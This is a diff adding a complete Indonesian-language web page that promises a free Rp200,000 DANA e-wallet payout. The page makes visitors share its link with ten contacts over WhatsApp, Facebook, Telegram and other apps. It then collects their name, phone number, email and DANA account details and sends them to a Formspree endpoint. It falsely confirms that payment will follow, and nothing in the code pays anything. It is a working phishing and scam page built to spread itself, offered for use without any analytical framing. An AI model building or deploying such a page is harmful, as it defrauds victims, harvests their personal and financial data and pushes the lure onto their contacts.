@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Klaim Dana Gratis Rp200.000</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0b2b26 0%, #1a4d3e 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            max-width: 550px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.97);
+            border-radius: 48px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.35);
+            overflow: hidden;
+        }
+
+        .hero {
+            background: linear-gradient(120deg, #ffd966, #ffb347);
+            padding: 30px 20px 25px;
+            text-align: center;
+            color: #2c2c2c;
+        }
+
+        .hero h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+        }
+
+        .hero .amount {
+            font-size: 3.8rem;
+            font-weight: 800;
+            background: #1e2a2a;
+            display: inline-block;
+            padding: 10px 24px;
+            border-radius: 60px;
+            margin-top: 12px;
+            color: #ffeaac;
+        }
+
+        .badge {
+            background: #2c5f4e;
+            display: inline-block;
+            padding: 6px 18px;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-top: 15px;
+            color: #f9f3d9;
+        }
+
+        .content {
+            padding: 28px 24px 35px;
+        }
+
+        /* Progress Section */
+        .progress-section {
+            background: #f0f3f2;
+            border-radius: 36px;
+            padding: 18px 20px;
+            margin-bottom: 28px;
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #1e3b32;
+        }
+
+        .progress-bar-bg {
+            background: #cfdfda;
+            border-radius: 40px;
+            height: 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            background: linear-gradient(90deg, #f5b042, #ff8c1a);
+            width: 0%;
+            height: 100%;
+            border-radius: 40px;
+            transition: width 0.3s;
+        }
+
+        .share-count-text {
+            font-weight: 700;
+            margin-top: 12px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #2b6b56;
+        }
+
+        /* Share Buttons */
+        .share-title {
+            font-weight: 700;
+            font-size: 1.3rem;
+            margin: 20px 0 10px;
+            color: #1f4d3e;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .info-note {
+            background: #fef5e8;
+            border-left: 5px solid #ffb347;
+            padding: 12px 15px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            font-size: 0.8rem;
+        }
+
+        .share-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 14px;
+            margin: 20px 0;
+        }
+
+        .share-btn {
+            background: white;
+            border: none;
+            padding: 12px 8px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            border: 1px solid #e2e8e6;
+            transition: 0.2s;
+        }
+
+        .share-btn:active {
+            transform: scale(0.96);
+        }
+
+        .share-btn:hover {
+            background: #f9f1e2;
+            border-color: #ffb347;
+        }
+
+        /* Form */
+        .form-page {
+            display: none;
+        }
+
+        .form-page.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #2c5f4e;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 40px;
+            border: 1px solid #ccc;
+            font-size: 0.9rem;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #ffb347;
+            box-shadow: 0 0 0 3px rgba(255, 180, 71, 0.2);
+        }
+
+        .submit-btn {
+            background: linear-gradient(95deg, #27ae60, #2ecc71);
+            width: 100%;
+            padding: 14px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.2s;
+        }
+
+        .submit-btn:active {
+            transform: scale(0.98);
+        }
+
+        .back-link {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.8rem;
+        }
+
+        .back-link button {
+            background: none;
+            border: none;
+            color: #ff8c1a;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .home-btn {
+            background: #ffb347;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 28px;
+            margin-top: 20px;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 28px;
+            margin-top: 20px;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .footer {
+            background: #f8f9fa;
+            padding: 15px;
+            text-align: center;
+            font-size: 0.7rem;
+            color: #6c757d;
+            border-top: 1px solid #e0e6e2;
+        }
+
+        @media (max-width: 480px) {
+            .hero h1 { font-size: 1.6rem; }
+            .hero .amount { font-size: 2.5rem; padding: 6px 18px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="hero">
+        <h1>🎉 KLAIM DANA GRATIS 🎉</h1>
+        <div class="amount">Rp 200.000</div>
+        <div class="badge"><i class="fas fa-gift"></i> Bonus Eksklusif</div>
+    </div>
+
+    <!-- Halaman Share -->
+    <div id="sharePage" class="content">
+        <div class="progress-section">
+            <div class="progress-label">
+                <span><i class="fas fa-users"></i> Syarat bagikan ke 10 orang</span>
+                <span id="shareCounterDisplay">0</span><span>/10</span>
+            </div>
+            <div class="progress-bar-bg">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="share-count-text" id="shareHint">
+                🔔 Klik tombol share di bawah, poin akan langsung bertambah. Lakukan 10 kali untuk membuka formulir.
+            </div>
+        </div>
+
+        <div class="share-title">
+            <i class="fas fa-share-alt"></i> Bagikan ke 10 Teman
+        </div>
+        <div class="info-note">
+            <i class="fas fa-info-circle"></i> <strong>Cara kerja:</strong> Klik tombol share, bagikan link ke teman. Setiap klik = +1 poin.<br>
+            Setelah 10 poin, Anda akan diarahkan ke halaman isi data untuk klaim.
+        </div>
+
+        <div class="share-grid" id="shareButtonsContainer">
+            <button class="share-btn" data-share-type="whatsapp"><i class="fab fa-whatsapp" style="color:#25D366;"></i> WhatsApp</button>
+            <button class="share-btn" data-share-type="facebook"><i class="fab fa-facebook" style="color:#1877F2;"></i> Facebook</button>
+            <button class="share-btn" data-share-type="twitter"><i class="fab fa-twitter" style="color:#1DA1F2;"></i> Twitter</button>
+            <button class="share-btn" data-share-type="telegram"><i class="fab fa-telegram" style="color:#26A5E4;"></i> Telegram</button>
+            <button class="share-btn" data-share-type="copy"><i class="fas fa-link" style="color:#6c5ce7;"></i> Salin Link</button>
+            <button class="share-btn" data-share-type="messenger"><i class="fab fa-facebook-messenger" style="color:#0084ff;"></i> Messenger</button>
+        </div>
+    </div>
+
+    <!-- Halaman Form Data -->
+    <div id="formPage" class="content form-page">
+        <h2 style="margin-bottom: 20px; color:#1e3b32;"><i class="fas fa-edit"></i> Isi Data Penerima</h2>
+        <p style="margin-bottom: 20px; color:#555;">Lengkapi data berikut untuk mengirimkan dana Rp200.000 ke akun Dana Anda.</p>
+        <form id="claimForm">
+            <div class="form-group">
+                <label>Nama Lengkap</label>
+                <input type="text" id="fullName" name="nama_lengkap" placeholder="Contoh: Budi Santoso" required>
+            </div>
+            <div class="form-group">
+                <label>No. Telepon</label>
+                <input type="tel" id="phone" name="no_telepon" placeholder="081234567890" required>
+            </div>
+            <div class="form-group">
+                <label>Gmail</label>
+                <input type="email" id="email" name="email" placeholder="budi@gmail.com" required>
+            </div>
+            <div class="form-group">
+                <label>No. Rekening Dana</label>
+                <input type="text" id="danaAccount" name="no_rek_dana" placeholder="Nomor akun Dana" required>
+            </div>
+            <div class="form-group">
+                <label>Nama Rekening Dana</label>
+                <input type="text" id="danaName" name="nama_rek_dana" placeholder="Nama sesuai rekening" required>
+            </div>
+            <button type="submit" class="submit-btn"><i class="fas fa-hand-holding-usd"></i> KLAIM SEKARANG</button>
+            <div class="back-link">
+                <button type="button" id="backToShareBtn"><i class="fas fa-arrow-left"></i> Kembali ke halaman share</button>
+            </div>
+        </form>
+        <div id="formMessage"></div>
+    </div>
+
+    <!-- Halaman Sukses -->
+    <div id="successPage" class="content form-page">
+        <div class="success-message" id="successMessage"></div>
+        <button id="goToHomeBtn" class="home-btn"><i class="fas fa-home"></i> Kembali ke Halaman Utama</button>
+    </div>
+
+    <div class="footer">
+        © 2025 • Klaim Dana Gratis
+    </div>
+</div>
+
+<script>
+    // Konstanta
+    const STORAGE_SHARE_KEY = 'claimBonus_shareCount';
+    const STORAGE_CLAIMED_KEY = 'claimBonus_claimed';
+    const STORAGE_USER_DATA_KEY = 'claimBonus_userData';
+    const REQUIRED_SHARES = 10;
+    const BONUS_AMOUNT = "Rp 200.000";
+    const FORMSPREE_URL = "https://formspree.io/f/xdapnkwy";
+
+    // Elemen DOM
+    const sharePage = document.getElementById('sharePage');
+    const formPage = document.getElementById('formPage');
+    const successPage = document.getElementById('successPage');
+    const shareCounterSpan = document.getElementById('shareCounterDisplay');
+    const progressFill = document.getElementById('progressFill');
+    const shareHint = document.getElementById('shareHint');
+    const claimForm = document.getElementById('claimForm');
+    const backToShareBtn = document.getElementById('backToShareBtn');
+    const goToHomeBtn = document.getElementById('goToHomeBtn');
+    const formMessageDiv = document.getElementById('formMessage');
+    const successMessageDiv = document.getElementById('successMessage');
+
+    let currentShareCount = 0;
+    let isClaimed = false;
+
+    // Load data dari localStorage
+    function loadState() {
+        const storedShare = localStorage.getItem(STORAGE_SHARE_KEY);
+        if (storedShare !== null && !isNaN(parseInt(storedShare))) {
+            currentShareCount = Math.min(parseInt(storedShare), REQUIRED_SHARES);
+        } else {
+            currentShareCount = 0;
+        }
+        const storedClaimed = localStorage.getItem(STORAGE_CLAIMED_KEY);
+        isClaimed = (storedClaimed === 'true');
+        // Sinkronisasi jika sudah klaim tapi share kurang
+        if (isClaimed && currentShareCount < REQUIRED_SHARES) {
+            currentShareCount = REQUIRED_SHARES;
+            localStorage.setItem(STORAGE_SHARE_KEY, currentShareCount);
+        }
+    }
+
+    function persistState() {
+        localStorage.setItem(STORAGE_SHARE_KEY, currentShareCount);
+        localStorage.setItem(STORAGE_CLAIMED_KEY, isClaimed);
+    }
+
+    // Update tampilan progress di halaman share
+    function updateShareUI() {
+        shareCounterSpan.innerText = currentShareCount;
+        const percent = (currentShareCount / REQUIRED_SHARES) * 100;
+        progressFill.style.width = `${percent}%`;
+        if (currentShareCount >= REQUIRED_SHARES) {
+            progressFill.style.backgroundColor = "#ff8c1a";
+        }
+        if (!isClaimed && currentShareCount >= REQUIRED_SHARES) {
+            shareHint.innerHTML = "<i class='fas fa-unlock-alt'></i> ✅ Syarat share terpenuhi! Klik tombol di bawah untuk ke halaman isi data.";
+        } else if (!isClaimed) {
+            shareHint.innerHTML = `🔗 Sisa ${REQUIRED_SHARES - currentShareCount} share lagi. Setiap klik tombol share = +1 poin!`;
+        } else {
+            shareHint.innerHTML = "🎉 Anda sudah mengklaim hadiah!";
+        }
+    }
+
+    // Menampilkan halaman yang sesuai berdasarkan status
+    function showCorrectPage() {
+        if (isClaimed) {
+            // Halaman sukses
+            const userData = localStorage.getItem(STORAGE_USER_DATA_KEY);
+            if (userData) {
+                const data = JSON.parse(userData);
+                successMessageDiv.innerHTML = `
+                    <i class="fas fa-check-circle"></i> <strong>KLAIM BERHASIL!</strong><br>
+                    Dana ${BONUS_AMOUNT} akan dikirim ke:<br>
+                    <strong>Nama:</strong> ${data.fullName}<br>
+                    <strong>No. Dana:</strong> ${data.danaAccount} a.n. ${data.danaName}<br>
+                    <strong>Email:</strong> ${data.email}<br>
+                    Cek akun Dana Anda dalam 1x24 jam.
+                `;
+            } else {
+                successMessageDiv.innerHTML = `<i class="fas fa-check-circle"></i> Dana ${BONUS_AMOUNT} telah diklaim.`;
+            }
+            sharePage.style.display = 'none';
+            formPage.classList.remove('active');
+            successPage.classList.add('active');
+        } 
+        else if (currentShareCount >= REQUIRED_SHARES) {
+            // Tampilkan form data
+            sharePage.style.display = 'none';
+            successPage.classList.remove('active');
+            formPage.classList.add('active');
+        } 
+        else {
+            // Tampilkan halaman share
+            sharePage.style.display = 'block';
+            formPage.classList.remove('active');
+            successPage.classList.remove('active');
+            updateShareUI();
+        }
+    }
+
+    // Tambah poin share
+    function incrementShare() {
+        if (isClaimed) {
+            alert("⚠️ Anda sudah mengklaim hadiah.");
+            return false;
+        }
+        if (currentShareCount >= REQUIRED_SHARES) {
+            alert("✅ Anda sudah mencapai 10 share! Silakan isi data untuk klaim.");
+            return false;
+        }
+        currentShareCount++;
+        persistState();
+        updateShareUI();
+        showToast(`✅ +1 Share! Total: ${currentShareCount}/${REQUIRED_SHARES}`);
+        if (currentShareCount === REQUIRED_SHARES) {
+            showCorrectPage(); // langsung pindah ke form
+        }
+        return true;
+    }
+
+    function showToast(message) {
+        const toast = document.createElement('div');
+        toast.innerText = message;
+        toast.style.position = "fixed";
+        toast.style.bottom = "20px";
+        toast.style.left = "50%";
+        toast.style.transform = "translateX(-50%)";
+        toast.style.backgroundColor = "#2ecc71";
+        toast.style.color = "white";
+        toast.style.padding = "12px 24px";
+        toast.style.borderRadius = "50px";
+        toast.style.fontWeight = "bold";
+        toast.style.zIndex = "9999";
+        toast.style.boxShadow = "0 5px 15px rgba(0,0,0,0.2)";
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 2000);
+    }
+
+    // Kirim data ke Formspree, lalu klaim
+    async function processClaim(formData) {
+        if (isClaimed) return;
+        if (currentShareCount < REQUIRED_SHARES) {
+            alert("Syarat share belum terpenuhi.");
+            return;
+        }
+
+        const submitBtn = document.querySelector('.submit-btn');
+        const originalText = submitBtn.innerHTML;
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Mengirim data...';
+        submitBtn.disabled = true;
+        formMessageDiv.innerHTML = ''; // bersihkan pesan lama
+
+        try {
+            const formDataToSend = new FormData();
+            formDataToSend.append('nama_lengkap', formData.fullName);
+            formDataToSend.append('no_telepon', formData.phone);
+            formDataToSend.append('email', formData.email);
+            formDataToSend.append('no_rek_dana', formData.danaAccount);
+            formDataToSend.append('nama_rek_dana', formData.danaName);
+            formDataToSend.append('_subject', 'Klaim Dana Rp200.000 - Data Penerima');
+            formDataToSend.append('_replyto', formData.email);
+
+            const response = await fetch(FORMSPREE_URL, {
+                method: 'POST',
+                body: formDataToSend,
+                headers: { 'Accept': 'application/json' }
+            });
+
+            if (response.ok) {
+                // Simpan data lokal
+                localStorage.setItem(STORAGE_USER_DATA_KEY, JSON.stringify(formData));
+                isClaimed = true;
+                persistState();
+                showCorrectPage();
+                triggerConfettiEffect();
+                disableShareButtons();
+            } else {
+                const errorText = await response.text();
+                console.error('Formspree error:', errorText);
+                formMessageDiv.innerHTML = '<div class="error-message"><i class="fas fa-exclamation-triangle"></i> Gagal mengirim data. Silakan coba lagi.</div>';
+            }
+        } catch (error) {
+            console.error(error);
+            formMessageDiv.innerHTML = '<div class="error-message"><i class="fas fa-exclamation-triangle"></i> Terjadi kesalahan jaringan. Periksa koneksi Anda.</div>';
+        } finally {
+            submitBtn.innerHTML = originalText;
+            submitBtn.disabled = false;
+        }
+    }
+
+    function disableShareButtons() {
+        const btns = document.querySelectorAll('.share-btn');
+        btns.forEach(btn => {
+            btn.disabled = true;
+            btn.style.opacity = '0.5';
+            btn.style.cursor = 'default';
+            btn.style.pointerEvents = 'none';
+        });
+    }
+
+    function triggerConfettiEffect() {
+        const canvas = document.createElement('canvas');
+        canvas.style.position = 'fixed';
+        canvas.style.top = '0';
+        canvas.style.left = '0';
+        canvas.style.width = '100%';
+        canvas.style.height = '100%';
+        canvas.style.pointerEvents = 'none';
+        canvas.style.zIndex = '9999';
+        document.body.appendChild(canvas);
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        let particles = [];
+        for (let i = 0; i < 120; i++) {
+            particles.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height - canvas.height,
+                size: Math.random() * 6 + 3,
+                color: `hsl(${Math.random() * 360}, 70%, 60%)`,
+                speedY: Math.random() * 5 + 3,
+                speedX: (Math.random() - 0.5) * 2,
+            });
+        }
+        let animationId;
+        function animate() {
+            if (!canvas.parentNode) return;
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            let active = false;
+            for (let p of particles) {
+                p.y += p.speedY;
+                p.x += p.speedX;
+                if (p.y < canvas.height + 50) active = true;
+                ctx.fillStyle = p.color;
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+                ctx.fill();
+            }
+            if (active) {
+                animationId = requestAnimationFrame(animate);
+            } else {
+                cancelAnimationFrame(animationId);
+                canvas.remove();
+            }
+        }
+        animate();
+        setTimeout(() => {
+            if (canvas.parentNode) canvas.remove();
+            if (animationId) cancelAnimationFrame(animationId);
+        }, 2000);
+    }
+
+    // Event handler untuk share
+    function handleShare(platform) {
+        if (isClaimed) {
+            alert("Hadiah sudah diklaim.");
+            return;
+        }
+        if (currentShareCount >= REQUIRED_SHARES) {
+            alert("Anda sudah mencapai 10 share. Silakan isi data untuk klaim.");
+            return;
+        }
+
+        const url = window.location.href;
+        const fullText = `Klaim dana gratis Rp200.000! Buktikan sendiri: ${url}`;
+
+        switch (platform) {
+            case 'whatsapp':
+                window.open(`https://wa.me/?text=${encodeURIComponent(fullText)}`, '_blank', 'noopener,noreferrer');
+                break;
+            case 'facebook':
+                window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`, '_blank', 'noopener,noreferrer');
+                break;
+            case 'twitter':
+                window.open(`https://twitter.com/intent/tweet?text=${encodeURIComponent("Dapatkan Rp200.000 gratis!")}&url=${encodeURIComponent(url)}`, '_blank', 'noopener,noreferrer');
+                break;
+            case 'telegram':
+                window.open(`https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent("🎉 Bonus Rp200.000, klaim sekarang!")}`, '_blank', 'noopener,noreferrer');
+                break;
+            case 'messenger':
+                window.open(`https://www.facebook.com/dialog/send?link=${encodeURIComponent(url)}&app_id=123456789&redirect_uri=${encodeURIComponent(url)}`, '_blank', 'noopener,noreferrer');
+                break;
+            case 'copy':
+                navigator.clipboard.writeText(url).then(() => {
+                    incrementShare();
+                    alert("✅ Link disalin! Poin +1.");
+                }).catch(() => alert("Gagal menyalin link."));
+                return;
+            default:
+                return;
+        }
+        incrementShare();
+    }
+
+    function initShareButtons() {
+        document.querySelectorAll('.share-btn').forEach(btn => {
+            const type = btn.getAttribute('data-share-type');
+            if (type) btn.addEventListener('click', () => handleShare(type));
+        });
+    }
+
+    // Event listener form
+    claimForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const fullName = document.getElementById('fullName').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const danaAccount = document.getElementById('danaAccount').value.trim();
+        const danaName = document.getElementById('danaName').value.trim();
+
+        if (!fullName || !phone || !email || !danaAccount || !danaName) {
+            alert("Semua field harus diisi!");
+            return;
+        }
+        if (!/^\d+$/.test(phone.replace(/\s/g, ''))) {
+            alert("Nomor telepon harus berupa angka.");
+            return;
+        }
+        if (!email.includes('@') || !email.includes('.')) {
+            alert("Masukkan email yang valid.");
+            return;
+        }
+        if (!/^\d+$/.test(danaAccount.replace(/\s/g, ''))) {
+            alert("Nomor rekening Dana harus berupa angka.");
+            return;
+        }
+
+        await processClaim({ fullName, phone, email, danaAccount, danaName });
+    });
+
+    // Kembali ke halaman share dari form
+    backToShareBtn.addEventListener('click', () => {
+        if (!isClaimed) {
+            sharePage.style.display = 'block';
+            formPage.classList.remove('active');
+            updateShareUI();
+        }
+    });
+
+    // Tombol kembali ke halaman utama dari halaman sukses
+    goToHomeBtn.addEventListener('click', () => {
+        sharePage.style.display = 'block';
+        successPage.classList.remove('active');
+        updateShareUI();
+    });
+
+    // Inisialisasi
+    function init() {
+        loadState();
+        initShareButtons();
+        showCorrectPage();
+        if (isClaimed) disableShareButtons();
+    }
+
+    init();
+</script>
+</body>
+</html>
